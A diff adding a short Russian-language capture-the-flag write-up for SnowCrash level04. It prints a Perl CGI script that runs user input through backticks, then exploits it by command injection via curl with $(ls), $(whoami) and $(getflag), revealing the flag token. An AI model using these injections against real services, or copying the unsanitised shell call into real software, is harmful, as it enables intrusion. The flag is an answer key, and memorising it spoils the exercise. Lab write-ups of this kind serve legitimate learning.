@@ -1,1 +1,29 @@
-level04
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+Зайдя видим этот скрипт
+Из него понятно, что на 4747 работает сервер, в котором настроен CGI
+Принимает параметром x, который попробуем ему передать
+
+level04@SnowCrash:~$ curl localhost:4747?x='$(ls)'
+level04.pl
+
+Выходит, а значит можем продожать
+
+
+level04@SnowCrash:~$ curl localhost:4747?x='$(whoami)'
+flag04
+
+Команды выполняются от флага, а значит ему нужно передать getflag
+
+level04@SnowCrash:~$ curl localhost:4747?x='$(getflag)'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+Флаг получен
